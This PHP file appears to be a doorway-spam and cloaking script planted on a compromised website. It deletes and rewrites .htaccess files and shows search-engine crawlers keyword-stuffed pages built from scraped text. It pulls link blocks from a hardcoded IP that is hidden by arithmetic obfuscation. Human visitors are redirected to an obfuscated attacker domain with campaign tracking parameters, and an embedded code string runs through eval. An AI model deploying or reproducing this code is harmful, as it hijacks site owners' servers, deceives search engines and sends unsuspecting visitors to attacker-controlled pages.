<?php 
$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (file_exists($ff)) unlink ($ff);	

$templateName = "g874600"; //FIX template
$templatepath="papkaa17";
$usetemplates="yes";
$randomtemplate="yes";
$keyparseornot="no";
$trendskeys="no";
$valuetrends="10";
$cloakornotcloak="no";
$resurl="cfkc.php?bi={urlkey}";
$perem="bi";
$keyspath="par.txt";
$kollinks="5";
$linksrazdel=" , ";
$extlinkspath="";
$contentsou="2";
$textfile="./text.txt";
$articlesvalue="2";
$randomabarticles="yes";
$bookskeyvalue="10";
$sitemap="no";
$maplinksvalue="480";
$maplinksraz="<br> "; 
$indexkey="News";
$imageyes="no";
$imagepath="gallery";
$redir="";
$includephpcode = '$ref = $_SERVER["HTTP_REFERER"];
$d = $_SERVER["HTTP_HOST"];
function getUrl() {
  $url  = @( $_SERVER["HTTPS"] != "on" ) ? "http://".$_SERVER["SERVER_NAME"] :  "https://".$_SERVER["SERVER_NAME"];
  $url .= ( $_SERVER["SERVER_PORT"] != 80 ) ? ":".$_SERVER["SERVER_PORT"] : "";
  $url .= $_SERVER["REQUEST_URI"];
  return $url;
}    
$s = getUrl();
if (!strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "crawler")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "bot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "yahoo")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "bot")===false)
{
	if ((filesize(".htaccess"))>100)
	{
	         $out = fopen("../.htaccess", "w");
             fwrite ($out, "RewriteEngine On 
             RewriteRule ^(.*).html$ cfkc.php?bi=$1 [L]");
             fclose($out);	
	}
echo $page;
}
else
{
$adr1 = ".........................................................................................................................................................................................";
$adr2 = "...............................................................................................................................................................................";
$adr3 = "............................................................................................................................................................";
$adr4 = ".................................";
$ard = strlen($adr1).".".strlen($adr2).".".strlen($adr3).".".strlen($adr4);
$s = dirname($_SERVER["PHP_SELF"]);
$s = $_SERVER["SERVER_NAME"] . $s;
$mykeys  = $_GET["bi"];
$zzrz = chr(117);
header(	"Location: http://".$zzrz."sdfsfes.xyz/LknkDz?host=".$s."&mark=3011201957k_obi_13012020_2500_7papki_TOP_Gilok_linked&keyword=".$mykeys."&template=".$templName."&se_referrer=".urlencode($_SERVER[\'HTTP_REFERER\'])	);
exit;
}
';
$cachepath="./evudsvi35";
$yourip=""; 
$dopips="";
$logornot="no"; 
$pingornot="no";
$pingres="http://rpc.pingomatic.com/";
$firstnoredir="no";
$redirtime="5";

ini_set('memory_limit',"256M");
ini_set('display_errors', 0);
$userip=explode(".", $_SERVER['REMOTE_ADDR']);
$usernetip=trim($userip[0]).".".trim($userip[1]).".".trim($userip[2]).".".trim($userip[3]);
$botips="  ".$yourip." ".$dopips." ";
$keyfromurl =$_GET[$perem];	
$keyfromurlMd5 = md5($keyfromurl);


if(!$keyfromurl){
	$keyfromurl=$indexkey;
}

$key = str_replace("-", " ", $keyfromurl);
$key=trim($key);
$keyredir = str_replace(" ", "+", $key);
$keydefis = str_replace(" ", "-", $keyfromurl);
$keydecode = str_replace("-", "+", $keyfromurl);
$keydecode = str_replace("'", "", $keydecode);
$keydecode = str_replace("\\", "", $keydecode);
$keydecode=trim($keydecode);
$usedurl=str_replace("{urlkey}", $keydefis, $resurl);
if($logornot=="yes"){
	$fileot="./log.txt";
	$fhf=fopen($fileot, "a+");
	$dataot="Page ".$usedurl." : ". $_SERVER['HTTP_REFERER']."    ".$_SERVER['HTTP_USER_AGENT']."    ".$_SERVER['REMOTE_ADDR']."    ".date("dS h:i:s A")."\n";
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
	flock($fhf,LOCK_UN);
	fclose($fhf);
}
	
if($keyfromurl=="mysitemap" && file_exists("map.txt")){
	$pagemap=file_get_contents("./map.txt");
	echo $pagemap;
	die();
}

if($sitemap=="yes" && !file_exists("map.txt")){
	$mapkeys=file_get_contents($keyspath);
	$mapkeys=explode("\n", $mapkeys);
	srand((float)microtime() * 1000000);
	shuffle($mapkeys);
	$mapkeys = array_slice($mapkeys, 0, $maplinksvalue);
	$fileot="./map.txt";
	$fhf=fopen($fileot, "w");
	$dataot1="";
	$dataot2=array();
	
	foreach($mapkeys as $mapkey){
		$mapkey=trim($mapkey);
		$mapkeyurl=str_replace(" ", "-", $mapkey);
		$mapurl=str_replace("{urlkey}", $mapkeyurl, $resurl);
		$dataot2[]="<a href=\"".$mapurl."\">".$mapkey."</a>".$maplinksraz;
	}
	
	$dataot2=implode($dataot2);
	$dataot=$dataot1." ".$dataot2."	";
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
	flock($fhf,LOCK_UN);
	fclose($fhf);
	$mapkeys="";

}

if($sitemap=="yes" && file_exists("map.txt")){
	$mapinpage=str_replace("{urlkey}", "mysitemap", $resurl);
	$mapinpages="<br><a href=\"".$mapinpage."\">SiteMap</a><br>";
}

$redir=str_replace("{redirkeyword}", $keyredir, $redir);
	
if (!strpos($botips, $usernetip)===false || !strpos($_SERVER['HTTP_USER_AGENT'], "Googlebot")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "crawler")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "bot")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "yahoo")===false || $cloakornotcloak=="no"){

	if($cloakornotcloak=="no"){
		$cloaknoredir=$includephpcode;
	}

	$dir = opendir($cachepath); 
	while(($file = readdir($dir))){ 
	  
		if($file!="." && $file!=".."){
			$file=trim($file);
			
			$delimitFile=explode("_",$file);
			$templName=$delimitFile[1];
			
			if($keyfromurlMd5==$delimitFile[0]){
				$page=file_get_contents($cachepath."/".$file);
				
				if($extlinkspath){
					$extlinks=file_get_contents($extlinkspath);
					$page=str_replace("{extlinks}", $extlinks, $page);
				}

				if($firstnoredir=="yes"){
					$todaydate=date("d");
					$matchesparse=array();
					$patternparse = "/<!--([0-9]*)-->/sU";
					preg_match_all($patternparse, $page, $matchesparse);
					$gentime=$matchesparse[1][0];
					
					if($gentime){
						$needtime=$todaydate-$gentime;

						if(abs($needtime)>=$redirtime){
							$page=str_replace("<!--red-->", $redir, $page);
							$page=preg_replace("/<!--([0-9]*)-->/", "", $page);
							$fileot=$cachepath."/".$keyfromurlMd5;
							$fhf=fopen($fileot, "w+");
							$dataot=$page;
							flock($fhf,LOCK_EX);
							fwrite($fhf, $dataot);
							fflush($fhf);
							flock($fhf,LOCK_UN);
							fclose($fhf);
						}
					}
				}
				if($includephpcode){

					$includephpcode=str_replace("{redirkeyword}", $keyredir, $includephpcode);
					ob_start();                     // Включаем буферизацию вывода
					ob_clean();                     // Чистим буфер (не обязательно)
					eval ($includephpcode);      // Выполняем нужный нам код, результат которого уходит в буфер
					$buffer=ob_get_contents();      // Пишем в переменную содержимое буфера
					ob_end_clean(); 
					//$patternparse = "/{phpcode}/";
					$page=str_replace("{phpcode}", $buffer, $page);

				}
				echo $page;
				die();
			}
		}	
	} 
	closedir($dir); 
	  
	if($contentsou==1 && $usetemplates=="no"){
		$pageparse=getcontent($key, "2", $keyfromurlMd5);
	}

	if($contentsou==2 && $usetemplates=="no"){
		$pageparse=getcontent2($key, "4");
	}

	if($contentsou==3 && $usetemplates=="no"){
		$pageparse=file_get_contents($textfile);
		$pageparse=explode(".", $pageparse);
		srand((float)microtime() * 1000000);
		shuffle($pageparse);
		$pageparse = array_slice($pageparse, 0, 20);
		$pageparse=implode(".", $pageparse);
	}

	if($contentsou==4 && $usetemplates=="no"){
		$pageparse=getcontent3($key, "2");
	}

	$wordscount=count(explode(" ", $key));

	if($keyparseornot=="yes" && $wordscount<=3){
		$googlekeys=keyparse($key);

		if(count($googlekeys)>=3){
			$forlinks1=$googlekeys;
			srand((float)microtime() * 1000000);
			shuffle($forlinks1);
			$kusokkeev=$forlinks1;
		}
		else
		{
			$forlinks1=file_get_contents($keyspath);
			$forlinks1=explode("\n", $forlinks1);
			srand((float)microtime() * 1000000);
			shuffle($forlinks1);
			$kusokkeev=array_chunk($forlinks1, $kollinks);
			$kusokkeev=$kusokkeev[0];
		}

	}
	else
	{
		$forlinks1=file_get_contents($keyspath);
		$forlinks1=explode("\n", $forlinks1);
		srand((float)microtime() * 1000000);
		shuffle($forlinks1);
		$kusokkeev=array_chunk($forlinks1, $kollinks);
		$kusokkeev=$kusokkeev[0];
	}

	if($trendskeys=="yes"){
		$alltrendskeys=keyparse2();
		srand((float)microtime() * 1000000);
		shuffle($alltrendskeys);
		$neededtrends=array_chunk($alltrendskeys, $valuetrends);
		$kusokkeev=array_merge ($kusokkeev, $neededtrends[0]);
		srand((float)microtime() * 1000000);
		shuffle($kusokkeev);
	}

	$links1=array();
	foreach($kusokkeev as $i=>$keyforurl){
		$keyforurl1=str_replace(" ", "-", $keyforurl);
		$keyforurl1=trim($keyforurl1);
		$keyforurl=trim($keyforurl);
		$linkingurl=str_replace("{urlkey}", $keyforurl1, $resurl);
		$links1[$i]=" <a href=\"".$linkingurl."\">".$keyforurl."</a>".$linksrazdel;
	}
	//////////////IMAGES////////////////
	if($imageyes=="yes" && $usetemplates=="no"){
		$files=array();
		$dir = opendir("./"); 
		
		while(($file = readdir($dir))){ 
			$files[]=trim($file);
		}
		
		closedir($dir);
		$files=implode(" ", $files);

		if(strpos($files, $imagepath)===false){
			mkdir("./".$imagepath);
		}
		
		$templateimage="<img src=\"".imagesparse($key, $imagepath)."\" alt=\"".$key."\">";
	}
	$links1=implode($links1);
	$date = date ("l dS of F Y h A");

	if($usetemplates=="no"){
		$pageview= "
		<html>
		<head>
		<meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" />
		<meta name=\"keywords\" content=\"".ucfirst($key)."\">
		<meta name=\"description\" content=\"".ucfirst($key)."\">
		<meta name=\"Robots\" content=\"index,follow\" />
		<meta name=\"Robots\" content=\"index,follow\" />
		<title>".ucfirst($key)."</title>
		</head>
		<body>
		".$cloaknoredir."
		<h1>".ucfirst($key)."</h1><br>
		<br>".$templateimage."<br><br>
		".$mapinpages."
		".$pageparse."<br>
		".$links1."
		</body>
		</html>";
	}
	elseif($usetemplates=="yes"){


		if($randomtemplate=="yes"){
		/*	$files=array();
			$dir = opendir($templatepath); 
			while(($file = readdir($dir))){ 
				if($file!="." && $file!=".."){
					$files[]=trim($file);
				}
			}
			closedir($dir);
			srand((float)microtime() * 1000000);
			shuffle($files);
			$goodtemplatefile=$files[0];*/
			$goodtemplate=file_get_contents("./".$templatepath."/".$templateName.".txt"); // FIX template
		}
		else{
			$goodtemplate=file_get_contents("./".$templatepath."/".$randomtemplate);
		}

		if($firstnoredir=="yes"){
			$goodtemplate=$goodtemplate."<!--".date("d")."-->";
		}
		
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{image}")) break 1;
				
			$goodtemplate=preg_replace("/{image}/", "<img src=\"".imagesparse($key, $imagepath)."\" alt=\"".$key."\">", $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{randurl}")) break 1;
			srand((float)microtime() * 1000000);
			shuffle($forlinks1);
			$forrandurl=str_replace(" ", "-", trim($forlinks1[0]));
			$randurl=str_replace("{urlkey}", $forrandurl, $resurl);
			$goodtemplate=preg_replace("/{randurl}/", $randurl, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{rankey}")) break 1;
			srand((float)microtime() * 1000000);
			shuffle($forlinks1);
			$goodtemplate=preg_replace("/{rankey}/", trim($forlinks1[0]), $goodtemplate, 1);
			
		}
			
		for ($i=0; $i<1000; $i++){
			if($textfile){
				$pageparse=file_get_contents($textfile);
				$pageparse=explode(".", $pageparse);
				srand((float)microtime() * 1000000);
				shuffle($pageparse);
				$pageparse = array_slice($pageparse, 0, 40);
				$pageparse[3]=$pageparse[3]." ".$key;
				$pageparse[5]=$pageparse[5]." <b>".$key."</b>";
				$pageparse[11]=$pageparse[11]." ".$key;
				$pageparse[14]=$pageparse[14]." <em>".$key."</em>";
				$pageparse[18]=$pageparse[18]." ".$key;
				$pageparse=implode(".", $pageparse);
			}
			if (!strstr($goodtemplate, "{manytext}")) break 1;
			
			$goodtemplate=preg_replace("/{manytext}/", $pageparse, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{manytext_bing}")) break 1;
			$pageparse=getcontent2($key, "4");
			$pageparse2=getcontent3($key, "4");
			$pageparse3=getcontent($key, "10", $keyfromurlMd5);
			$pageparse4=$pageparse." ".$pageparse2." ".$pageparse3;
			//$pageparse4=$pageparse3;
			shuffle($pageparse4);
			$goodtemplate=preg_replace("/{manytext_bing}/", $pageparse4, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{manytext_an}")) break 1;
			$pageparse=getcontent3($key, "2");
			$goodtemplate=preg_replace("/{manytext_an}/", $pageparse, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{bookstext}")) break 1;
			$pageparse=getbookcontent($key, $bookskeyvalue);
			$goodtemplate=preg_replace("/{bookstext}/", $pageparse, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{minitext}")) break 1;
			
			if($textfile){
				$pageparse=file_get_contents($textfile);
				$pageparse=explode(".", $pageparse);
				srand((float)microtime() * 1000000);
				shuffle($pageparse);
				$pageparsemini= array_slice($pageparse, 0, 3);
				$pageparse[2]=$pageparse[2]." <b>".$key."</b>";
				$pageparsemini=implode(".", $pageparsemini);
			}
			$goodtemplate=preg_replace("/{minitext}/", $pageparsemini, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{minitext_bing}")) break 1;
			$pageparse=getcontent2($key, "1");
			$pageparsemini=explode(".", $pageparse);
			srand((float)microtime() * 1000000);
			shuffle($pageparsemini);
			$pageparsemini=array_slice($pageparsemini, 0, 5);
			$pageparsemini=implode(".", $pageparsemini);
			$goodtemplate=preg_replace("/{minitext_bing}/", $pageparsemini, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{minitext_ab}")) break 1;
			$pageparse=getcontent($key, "1", $keyfromurlMd5);
			$pageparsemini=explode(".", $pageparse);
			srand((float)microtime() * 1000000);
			shuffle($pageparsemini);
			$pageparsemini=array_slice($pageparsemini, 0, 5);
			$pageparsemini=implode(".", $pageparsemini);
			$goodtemplate=preg_replace("/{minitext_ab}/", $pageparsemini, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{minitext_an}")) break 1;
			$pageparse=getcontent3($key, "1");
			$pageparsemini=explode(".", $pageparse);
			srand((float)microtime() * 1000000);
			shuffle($pageparsemini);
			$pageparsemini=array_slice($pageparsemini, 0, 5);
			$pageparsemini=implode(".", $pageparsemini);
			$goodtemplate=preg_replace("/{minitext_an}/", $pageparsemini, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{manytext_all}")) break 1;
			$pageparse=getcontent($key, "2", $keyfromurlMd5);
			if(strlen($pageparse)<=10){
				$pageparse=getcontent2($key, "4");
			}
			$goodtemplate=preg_replace("/{manytext_all}/", $pageparse, $goodtemplate, 1);
		}
			
		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{minitext_all}")) break 1;
			$pageparse=getcontent($key, "1",$keyfromurlMd5);
			$pageparsemini=explode(".", $pageparse);
			srand((float)microtime() * 1000000);
			shuffle($pageparsemini);
			$pageparsemini=array_slice($pageparsemini, 0, 5);
			$pageparsemini=implode(".", $pageparsemini);

			if(strlen($pageparsemini)<=10){
				$pageparse=getcontent2($key, "1");
				$pageparsemini=explode(".", $pageparse);
				srand((float)microtime() * 1000000);
				shuffle($pageparsemini);
				$pageparsemini=array_slice($pageparsemini, 0, 5);
				$pageparsemini=implode(".", $pageparsemini);
			}
			$goodtemplate=preg_replace("/{minitext_all}/", $pageparse, $goodtemplate, 1);
		}

		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{ab_content}")) break 1;
			$pageparse=getcontentaba($key, $articlesvalue, $randomabarticles);
			if(strlen($pageparse)<=10){
				$pageparse=getcontent2($key, "4");
			}
			$goodtemplate=preg_replace("/{ab_content}/", $pageparse, $goodtemplate, 1);
		}

		for ($i=0; $i<1000; $i++){
			if (!strstr($goodtemplate, "{youtube}")) break 1;
			$pageparse=youtubeparse($key);
			$goodtemplate=preg_replace("/{youtube}/", $pageparse, $goodtemplate, 1);
		}
			
		$goodtemplate=str_replace("{keyword}", ucfirst($key), $goodtemplate);
		$goodtemplate=str_replace("{sitemaplink}", $mapinpages, $goodtemplate);
		$goodtemplate=str_replace("{links}", $links1, $goodtemplate);

		if($firstnoredir=="yes"){
			$goodtemplate=str_replace("{redirekt}", "<!--red-->", $goodtemplate);
		}
		else{
			$goodtemplate=str_replace("{redirekt}", $cloaknoredir, $goodtemplate);
		}
		
		$pageview=$goodtemplate;
	}

	echo $pageview;
	flush();
	//$nameTemplFile = explode(".",$goodtemplatefile);
	$fileot=$cachepath."/".$keyfromurlMd5."_".$templateName;	//FIX template
	$fhf=fopen($fileot, "w+");
	$dataot=$pageview;
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
	flock($fhf,LOCK_UN);
	fclose($fhf);
		
	if($pingornot=="yes"){
		$pingres=explode(" ", $pingres);
		foreach($pingres as $pingr){
			MYBlog_ping (trim($pingr), ucfirst($key), $usedurl);
		}
	}

}
else
{
echo $redir;
}



function getcontent($keyforparse, $cntpages, $keyforparseMd5){
	$keyforparse = chop($keyforparse);
	
	if (file_exists($cachepath."/".$keyforparseMd5)) echo " ";
	else{
		$query_pars = $keyforparse;
		$query_pars_2 = str_replace(" ", "+", chop($query_pars));
		$query_pars_3 = str_replace(" ", "-", chop($query_pars));
		$text = "";
		$ipppp=4+3;
		
		if (@extension_loaded('curl')){
			$ch = @curl_init();  
			curl_setopt($ch, CURLOPT_URL, "http://3".$ipppp.".1.200.".$ipppp."9/dbparse/index30112019.php?p=dsfw2131&q=".$query_pars_3); 
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
			$text = @curl_exec($ch); 
			curl_close($ch);
		}	
		else{
			$text = @file_get_contents("http://3".$ipppp.".1.200.".$ipppp."9/dbparse/index30112019.php?p=dsfw2131&q=".$query_pars_3);
		}
		
		
		
		if (strlen($text)<1000){
/////////////////////ASK/////////////////////////////////
			for($pagge=1;$pagge<5;$pagge++){
				if (@extension_loaded('curl')){
					$ch = @curl_init();  
					curl_setopt($ch, CURLOPT_URL, "http://www.ask.com/web?q=".$query_pars_3."&qsrc=11&adt=1&o=0&l=dir&page=".$pagge); 
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
					curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
					//curl_setopt($ch, CURLOPT_TIMEOUT, 1); 
					curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
					$result = @curl_exec($ch); 
					curl_close($ch);
				}
				else{
					$fp = @fsockopen("ssl://www.ask.com", 443);
					$result = @file_get_contents("http://www.ask.com/web?q=".$query_pars_3."&qsrc=11&adt=1&o=0&l=dir&page=".$pagge);
				}
				
				$result = str_replace("\r\n", "", $result);
				$result = str_replace("\n", "", $result);

				$ask_pattern = '/(?<=<p\ class="PartialSearchResults-item-abstract">)[\w\W]*?(?=<\/p>)/m';
				preg_match_all ($ask_pattern,$result,$m);
				//preg_match_all ("#web-result-description\">(.*)</p></div>#iU",$result,$m);
				foreach ($m[0] as $a) $text .= $a;
			}	
				
/////////////////////YAHOO////////////////////////////
			for($pagge=0;$pagge<1;$pagge++){
				if (@extension_loaded('curl')){
					$ch = @curl_init();  
					curl_setopt($ch, CURLOPT_URL, "http://search.yahoo.com/search?p=".$query_pars_2."&b=".$pagge."1&pz=10&bct=0&pstart=3"); 
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
					curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
					$result = @curl_exec($ch); 
					curl_close($ch);
				}
				else{
					$result = @file_get_contents("http://search.yahoo.com/search?p=".$query_pars_2."&b=".$pagge."1&pz=10&bct=0&pstart=3");
				}	
					preg_match_all ("#<p class=\"lh-16\">(.*)</p></div>#iU",$result,$m);
					foreach ($m[1] as $a) $text .= $a;	
				
			}
			
			

		}
		
		
		$text = str_replace("...", "", $text);
		$text = strip_tags($text); 
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = explode(".", $text);
		shuffle($text);
		$text = array_unique($text);
		$text = implode(". ", $text);
		
		
				///linked
		if (@extension_loaded('curl')){
			$ch1 = @curl_init();  
			curl_setopt($ch1, CURLOPT_URL, "http://37.1.200.79/logs2/linker.php" ); 
			curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1); 
			$linkzzz = @curl_exec($ch1); 
			curl_close($ch1);
		}	
		else{
			$linkzzz = @file_get_contents( "http://37.1.200.79/logs2/linker.php" );
		}
		/// linked

		
		
		$text = $text . $linkzzz;
		
		
		
		
		
		if (strlen($text)<1000){
			for($i=0; $i<100; $i++){
				$text .=$keyforparse.". ";
			}
		}

		
		return $text;
	}
}

function getcontent2($keyforparse, $cntpages){
}

function getcontent3($keyforparse, $cntpages)
{
}

function getcontentaba($keyforparse, $value, $random)
{
}

function generateCharSequence($length)
    {
//$sequence='';
        $chars = array(/*'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', */'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm');
        for($i=0; $i<$length; $i++) {
            $sequence .= $chars[rand(0, count($chars)-1)];
        }
        return $sequence;
    }

?>	